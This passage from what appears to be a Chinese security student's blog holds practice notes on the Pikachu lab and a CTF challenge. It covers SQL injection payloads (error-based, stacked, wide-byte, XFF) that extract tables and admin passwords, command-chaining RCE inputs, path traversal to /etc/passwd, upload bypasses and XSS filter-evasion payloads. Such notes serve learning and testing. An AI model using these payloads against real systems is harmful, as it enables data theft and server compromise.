<li>2.数据库信息：数据库蜜罐，数据库表，表字段，字段内容等（加密内容破解）</li>
</ul>
<p>第三步：获取权限</p>
<p> 获取操作系统权限：通过数据库执行shell，上传木马</p>
</blockquote>
<h3 id="注入点类型"><a href="#注入点类型" class="headerlink" title="注入点类型"></a>注入点类型</h3><p>按SQL语句拼接类型区分</p>
<ul>
<li>数字型：user_id=$id</li>
<li>字符型：user_id=’$id’</li>
<li>搜索型：text LIKE ‘%{$_GET[‘search’]}%’”</li>
</ul>
<h3 id="SQL中三种注释"><a href="#SQL中三种注释" class="headerlink" title="SQL中三种注释"></a>SQL中三种注释</h3><blockquote>
<p>① #</p>
<p>② – （最后面有个空格）</p>
<p>③ /**/，内联注释，这个可以在SQL语句中间使用。select * from /<em>sqli</em>/ users;</p>
</blockquote>
<h3 id="基于函数报错注入（updatexml）"><a href="#基于函数报错注入（updatexml）" class="headerlink" title="基于函数报错注入（updatexml）"></a>基于函数报错注入（updatexml）</h3><blockquote>
<p>技巧思路：</p>
<ul>
<li>在 MySQL 中使用一些指定的函数来制造报错，从报错信息中获取设定的信息</li>
<li>select / insert /update / delete 都可以使用报错来获取信息</li>
</ul>
<p>背景条件：</p>
<ul>
<li>后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端</li>
</ul>
<p>三个常用函数</p>
<ul>
<li>updatexml()： MySQL 对 XML 文档数据进行查询和修改的 XPATH 函数</li>
<li>extractvalue()：MySQL 对 XML 文档数据进行查询的 XPATH 函数</li>
<li>floor()：MySQL中用来取整的函数</li>
</ul>
</blockquote>
<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><p><a class="link"   href="https://www.cnblogs.com/dogecheng/p/11616282.html" >具体<i class="fas fa-external-link-alt"></i></a></p>
<p> updatexml()函数作用：改变（查找并替换）XML 文档中符合条件的节点的值</p>
<p> 语法：UPDATEXML (XML_document, XPath_string, new_value)</p>
<ul>
<li><blockquote>
<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
</blockquote>
</li>
<li><blockquote>
<p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。不过这里用不到。</p>
</blockquote>
</li>
<li><blockquote>
<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
</blockquote>
</li>
<li><blockquote>
<p>Xpath语法：<a class="link"   href="https://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html" >https://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
</li>
</ul>
<blockquote>
<p>XPath 定位必须是有效的，否则会发生错误</p>
</blockquote>
<p>在字符型注入中测试</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1, version(), 0)#</span></span><br></pre></td></tr></table></figure>

<p>报错</p>
<p>继续构造</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1, concat(0x7e, version()), 0)#</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302204718989-1646774732.png"
                      alt="img"
                ></p>
<p>修改 version() 为 database() 即可得数据库名称</p>
<p>查询表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;)), 0)#</span></span><br></pre></td></tr></table></figure>

<p>报错</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302204948144-218161360.png"
                      alt="img"
                ></p>
<p>在 payload 后面用 limit 关键字，限制取回的结果即可</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27; limit 0,1)), 0)#</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>上面返回了查询结果中的第一个表名，如果要查询第二个表名，我们可以把 limit 语句换成 limit 1,1</p>
<p>limit 后的第一个数据是起始位置，第二个数字是取出的数据条数</p>
</blockquote>
<p>获取字段</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1)), 0)#</span></span><br></pre></td></tr></table></figure>

<p> 获取数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1, concat(0x7e, (select username from users limit 0,1)), 0)#</span></span><br></pre></td></tr></table></figure>

<p>获取密码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1, concat(0x7e, (select password from users where username = &#x27;</span>admin<span class="string">&#x27; limit 0,1)), 0)#</span></span><br></pre></td></tr></table></figure>

<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p> extractvalue()函数作用：从目标 XML 中返回包含所查询值的字符串</p>
<p> 语法：ExtractValue(xml_document, XPathstring)</p>
<blockquote>
<ul>
<li>第一个参数：xml_document 是 string 格式，为 XML 文档对象的名称</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>第二个参数： XPathstring，XPath 格式的字符串</li>
</ul>
</blockquote>
<p>构造</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and extractvalue(1, concat(0x7e,database())) #</span></span><br></pre></td></tr></table></figure>

<h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><p>向下取整。如果要用 floor() 构成报错，必须满足下面的条件</p>
<ul>
<li><blockquote>
<p>运算中有 count</p>
</blockquote>
</li>
<li><blockquote>
<p>运算中有 group by</p>
</blockquote>
</li>
<li><blockquote>
<p>运算中有 rand</p>
</blockquote>
</li>
</ul>
<p>构造</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and (select 2 from (select count(*), concat(version(), floor(rand(0) * 2))x from information_schema.tables group by x)a)#</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>上面表达式执行的结果会以 “a” 作为别名，然后在 字符型注入 中提交，会得到下面的报错</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210304151045982-1013450607.png"
                      alt="img"
                ></p>
<p>我们可以把 version() 的表达式替换成别的表达式</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and (select 2 from (select count(*), concat((select password from users where username=&#x27;</span>admin<span class="string">&#x27; limit 0,1), floor(rand(0) * 2))x from information_schema.tables group by x)a)#</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><blockquote>
<p>RCE(remote command/code execute)概述</p>
<p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。远程系统命令执行<br>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口<br>比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器</p>
<p>现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的”收获”-_-<br>远程代码执行<br>同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>
</blockquote>
<h2 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h2><p>ping</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1</span><br></pre></td></tr></table></figure>

<p>出现如下结果</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210304165355517-1848439215.png"
                      alt="img"
                ></p>
<p>出现乱码</p>
<p>解决方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306153852778-1669047025.png"
                      alt="img"
                ></p>
<p>我自己尝试了一下，没有解决</p>
<p>再到网上搜其他方法，也没有解决</p>
<p>或许可以通过在源代码上增加转为UTF-8的几行代码</p>
<p>这一个没有去尝试</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306154845271-992102163.png"
                      alt="img"
                ></p>
<p>在命令执行漏洞中，可通过&amp;、&amp;&amp;、|、||、; 等符号拼接执行命令</p>
<p>如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; ipconfig</span><br></pre></td></tr></table></figure>

<p>不仅执行ping命令，ipconfig也执行</p>
<h2 id="exec-“evel”"><a href="#exec-“evel”" class="headerlink" title="exec “evel”"></a>exec “evel”</h2><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306155431470-796247682.png"
                      alt="img"
                ></p>
<p>可直接执行PHP代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">phpinfo()；</span><br></pre></td></tr></table></figure>

<h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><blockquote>
<p>File Inclusion(文件包含漏洞)概述</p>
<p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：<br>include(),include_once()<br>require(),require_once()<br>这些文件包含函数，这些函数在代码设计中被经常使用到。</p>
<p>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：</p>
<p>1.本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br>2.远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。</p>
</blockquote>
<h2 id="附-4"><a href="#附-4" class="headerlink" title="附"></a>附</h2><p>文件包含：<a class="link"   href="https://www.cnblogs.com/dogecheng/p/11635220.html" >介绍<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="unsafe-filedownload"><a href="#unsafe-filedownload" class="headerlink" title="unsafe filedownload"></a>unsafe filedownload</h1><blockquote>
<p>不安全的文件下载概述</p>
<p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。</p>
<p>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！</p>
</blockquote>
<h2 id="附-5"><a href="#附-5" class="headerlink" title="附"></a>附</h2><p>不安全文件下载：<a class="link"   href="https://www.cnblogs.com/dogecheng/p/11640389.html" >介绍<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="unsafe-upfileupload"><a href="#unsafe-upfileupload" class="headerlink" title="unsafe upfileupload"></a>unsafe upfileupload</h1><blockquote>
<p>不安全的文件上传漏洞概述</p>
<p>文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：</p>
<p>–验证文件类型、后缀名、大小;<br>–验证文件的上传方式;<br>–对文件进行一定复杂的重命名;<br>–不要暴露文件上传后的路径;<br>–等等…</p>
</blockquote>
<h2 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h2><p>删掉前端限制代码即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306161528075-582635400.png"
                      alt="img"
                ></p>
<h2 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h2><p>上传时，通过BP修改文件后缀</p>
<h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306162203876-941412136.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306162242382-319825807.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306162301362-1686481455.png"
                      alt="img"
                ></p>
<h2 id="附-6"><a href="#附-6" class="headerlink" title="附"></a>附</h2><p>不安全文件上传：<a class="link"   href="https://www.cnblogs.com/dogecheng/p/11640389.html" >详细<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="over-permission"><a href="#over-permission" class="headerlink" title="over permission"></a>over permission</h1><blockquote>
<p>概述</p>
<p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。因此，在在权限管理中应该遵守：<br>1.使用最小权限原则对用户进行赋权;<br>2.使用合理（严格）的权限校验规则;<br>3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;</p>
</blockquote>
<h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><p>查看lucy账号信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306212016619-1755608765.png"
                      alt="img"
                ></p>
<p>这里运用了GET 请求</p>
<p>将lucy改为lili</p>
<p>则可查看lili的信息</p>
<h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306212329618-1836131637.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306212350880-570401588.png"
                      alt="img"
                ></p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>练习记录</tag>
        <tag>pikachu</tag>
      </tags>
  </entry>
  <entry>
    <title>对XSS的基础了解</title>
    <url>/2021/%E5%AF%B9XSS%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="XSS-XSS基础"><a href="#XSS-XSS基础" class="headerlink" title="XSS-XSS基础"></a>XSS-XSS基础</h1><p>XSS攻击即为跨站脚本攻击（Cross Site Scripting）</p>
<blockquote>
<p>通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
</blockquote>
<p>前端漏洞，受害者为前端用户</p>
<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><blockquote>
<p>HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是HTML标签的开始，<title>与</title>之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。</p>
</blockquote>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>XSS相比于钓鱼网站危害更大</p>
<p>XSS具有以下特点：</p>
<blockquote>
<p>①由于XSS攻击在用户当前使用的应用程序中执行，用户将会看到与其有关的个性化信息，如账户信息或“欢迎回来”消息，克隆的Web站点不会显示个性化信息。</p>
<p>②通常，在钓鱼攻击中使用的克隆Web站点一经发现，就会立即被关闭。</p>
<p>③许多浏览器与安全防护软件产品都内置钓鱼攻击过滤器，可阻止用户访问恶意的克隆站点。</p>
<p>④如果客户访问一个克隆的Web网银站点，银行一般不承担责任。但是，如果攻击者通过银行应用程序中的XSS漏洞攻击了银行客户，则银行将不能简单地推卸责任。</p>
</blockquote>
<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>按攻击代码的工作方式分：</p>
<p>1.持久行跨站（存储型）：</p>
<p>  最直接的危害类型，跨站代码储存在服务器（数据库）</p>
<p>  永久性储存</p>
<p>2.非持久型跨站（反射型）：</p>
<p>  反射型跨站脚本漏洞，最普遍的类型</p>
<p>  一次性</p>
<p>3.DOM跨站（DOM XSS）：</p>
<p>  通过DOM操作前端代码输出时产生</p>
<p>  一次性</p>
<blockquote>
<p>基于DOM的XSS漏洞是指受害者端的网页脚本在修改本地页面DOM环境时未进行合理的处置，而使得攻击脚本被执行。在整个攻击过程中，服务器响应的页面并没有发生变化，引起客户端脚本执行结果差异的原因是对本地DOM的恶意篡改利用。</p>
</blockquote>
<h2 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h2><p>XSS漏洞形成的主要原因是程序对于输入与输出没有做到严格的把控导致攻击脚本被当作有效代码执行</p>
<h2 id="XSS漏洞测试流程"><a href="#XSS漏洞测试流程" class="headerlink" title="XSS漏洞测试流程"></a>XSS漏洞测试流程</h2><blockquote>
<p>① 在目标上找输入点，比如查询接口、留言板</p>
<p>② 输入一组 “特殊字符（&gt;，’，”等）+唯一识别字符” ，点击提交后，查看返回源码，看后端返回的数据是否有处理</p>
<p>③ 通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的条件（构造闭合）</p>
<p>④ 提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执行则说明存在XSS漏洞</p>
</blockquote>
<h2 id="常用XSS攻击手段与目的"><a href="#常用XSS攻击手段与目的" class="headerlink" title="常用XSS攻击手段与目的"></a>常用XSS攻击手段与目的</h2><blockquote>
<p>1、盗用cookie，获取敏感信息。</p>
<p>2、利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。</p>
<p>3、利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</p>
<p>4、利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</p>
<p>5、在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。</p>
</blockquote>
<h2 id="XSS基础过滤"><a href="#XSS基础过滤" class="headerlink" title="XSS基础过滤"></a>XSS基础过滤</h2><p>1.抓包重新插入，或修改前端HTML代码</p>
<p>2.修改大小写，若正则匹配只匹配小写，则可绕过</p>
<p>3.双写（拼凑），例如</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;scri<span class="tag">&lt;<span class="name">script</span>&gt;</span>pt&gt;alert(111)&lt;/scri<span class="tag">&lt;/<span class="name">script</span>&gt;<span class="name">pt</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>后台即使过滤script，也有只过滤一次的可能</p>
<p>4.注释干扰，例如</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;scri<span class="comment">&lt;!--test--&gt;</span>pt&gt;alert(111)&lt;/sc<span class="comment">&lt;!--test--&gt;</span>ript&gt;</span><br></pre></td></tr></table></figure>

<p>加上注释后，有绕过后台过滤机制的可能</p>
<p>5.编码，例 </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span> </span><br></pre></td></tr></table></figure>

<p>经过HTML编码为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="反射型xss（get-or-post）"><a href="#反射型xss（get-or-post）" class="headerlink" title="反射型xss（get or post）"></a>反射型xss（get or post）</h3><p>先判断有无过滤，然后写入xss代码</p>
<p>示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;BEACON&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>寻找输入点，然后进行xss攻击</p>
<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><h4 id="例一："><a href="#例一：" class="headerlink" title="例一："></a>例一：</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210221173637274-1162009598.png"
                      alt="img"
                ></p>
<p>我们先通过 “&gt; 闭合了herf标签，然后再插入相应的payload</p>
<p>根据提示构造payload ‘</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<h4 id="例二："><a href="#例二：" class="headerlink" title="例二："></a>例二：</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210221174421289-1365465828-1615636634143.png"
                      alt="img"
                ></p>
<p>与前面不同的是，前面通过 getElementById 获取到了标签 Id 为 text的内容赋值给str</p>
<p>然后又把 str 的内容通过字符串拼接的方式写到了 a 标签的 href 属性中，a标签会写到 Id 为 dom的 div 标签中</p>
<p>这里则是定义了一个domxss函数</p>
<p>利用 window.location.search 获取浏览器中URL的内容，然后赋值给 str</p>
<p>然后经过URL解码和字符串分隔，取出URL中的参数内容</p>
<p>再把 “+” 替换为 “ ”（空格），赋值给 xss</p>
<p>最后把 xss 拼接到 a 标签中，然后写到 Id 为 dom 的 div 标签中</p>
<p>跟前面的DOM不同的是，它的输入是从浏览器的URL中获取的</p>
<h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p><a class="link"   href="https://www.cnblogs.com/dogecheng/p/11556221.html" >基于pikachu漏洞练习平台关于XSS介绍与练习<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL-SQL注入进阶与绕过技术</title>
    <url>/2021/SQL-SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%E4%B8%8E%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h1 id="SQL-SQL注入进阶与绕过技术"><a href="#SQL-SQL注入进阶与绕过技术" class="headerlink" title="SQL-SQL注入进阶与绕过技术"></a>SQL-SQL注入进阶与绕过技术</h1><h2 id="SQL注入进阶"><a href="#SQL注入进阶" class="headerlink" title="SQL注入进阶"></a>SQL注入进阶</h2><h3 id="堆叠查询注入攻击"><a href="#堆叠查询注入攻击" class="headerlink" title="堆叠查询注入攻击"></a>堆叠查询注入攻击</h3><p>堆叠查询可执行多条语句，多语句之间以句号分隔</p>
<p>mysql_multi_query() 支持多条sql语句同时执行，即用’;’分隔多句SQL语句</p>
<p>注入示例：<a class="link"   href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8" >题目环境<i class="fas fa-external-link-alt"></i></a>[强网杯 2019]随便注</p>
<p>由于该题限制了某些SQL语句</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210315230956739.png"
                      alt="image-20210315230956739"
                ></p>
<p>故使用堆叠注入</p>
<p>构造类似</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show tables#</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210315231320417.png"
                      alt="image-20210315231320417"
                ></p>
<p>堆叠注入可与大多数查询语句结合</p>
<p>普通类型堆叠注入与时间输入结合的大致模板</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;;select if(substr(user(),1,1)=&#x27;</span>a<span class="string">&#x27;,sleep(3),1)#</span></span><br></pre></td></tr></table></figure>

<h3 id="二次注入攻击"><a href="#二次注入攻击" class="headerlink" title="二次注入攻击"></a>二次注入攻击</h3><p>二次注入主要分为两部分：</p>
<p>其一是恶意数据的插入</p>
<p>第一次对数据库进行数据插入的时候，仅对其中特殊字符进行转义，在写入数据库的时候还是保留原来的数据，却是忽略了插入的数据本身包含恶意内容</p>
<p>其二则是引用恶意数据</p>
<p>数据存入数据库之后，被认为是可信的，而在下一次查询时，可在没有二次检验的情况下从数据库中取出恶意数据，造成数据库的二次注入</p>
<h3 id="宽字节注入攻击"><a href="#宽字节注入攻击" class="headerlink" title="宽字节注入攻击"></a>宽字节注入攻击</h3><p>传入的引号被转义符（反斜线）转义，导致参数ID无法逃逸引号的包围</p>
<blockquote>
<p>PHP有addslashes()等函数，这类函数会自动过滤 ’ ‘’ null 等这些敏感字符，将它们转义成’ ‘’ \null</p>
</blockquote>
<p>故一般情况下，不存在SQL注入漏洞</p>
<p>然而，当数据库的编码为GBK时，可使用宽字节注入</p>
<p>宽字节的格式是在地址后先加’%df’，再添加引号</p>
<p>反斜杠的编码为”%5c”</p>
<p>在GBK编码中，”%df%5c”为繁体字“連”，故可使引号成功逃逸</p>
<p><a class="link"   href="https://blog.csdn.net/u011785309/article/details/104582250" >基于pikachu漏洞练习平台的宽字节注入攻击示例<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="cookie注入攻击"><a href="#cookie注入攻击" class="headerlink" title="cookie注入攻击"></a>cookie注入攻击</h3><p>URL中没有GET参数，但是页面返回正常，使用Burp Suite抓取数据包，发现cookie中存在id=1的参数</p>
<p>修改id值判断cookie中的参数ID是否存在SQK注入</p>
<p>若存在，即使用union注入方法即可</p>
<p>cookie注入与其他注入方式不同的仅在与注入点不同罢了</p>
<h3 id="base64注入攻击"><a href="#base64注入攻击" class="headerlink" title="base64注入攻击"></a>base64注入攻击</h3><p>原理即为将所需传递的参数经过base64加密后再传输</p>
<h3 id="XFF注入攻击"><a href="#XFF注入攻击" class="headerlink" title="XFF注入攻击"></a>XFF注入攻击</h3><p>抓取数据包在HTTP请求头中有一头部参数”X-Forwarded-for”</p>
<p>其简称为XFF头，代表客户端真实IP</p>
<p>修改其值可伪造客户端IP</p>
<p>将XFF值视为基本注入情况中的id值进行类似注入即可</p>
<p>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">for</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&#x27;union select 1,2,3#</span></span><br></pre></td></tr></table></figure>

<h2 id="SQL绕过技术"><a href="#SQL绕过技术" class="headerlink" title="SQL绕过技术"></a>SQL绕过技术</h2><h3 id="大小写绕过注入"><a href="#大小写绕过注入" class="headerlink" title="大小写绕过注入"></a>大小写绕过注入</h3><p>示例：</p>
<p>访问id=1 and 1=1</p>
<p>页面被拦截，即说明有关键词被过滤</p>
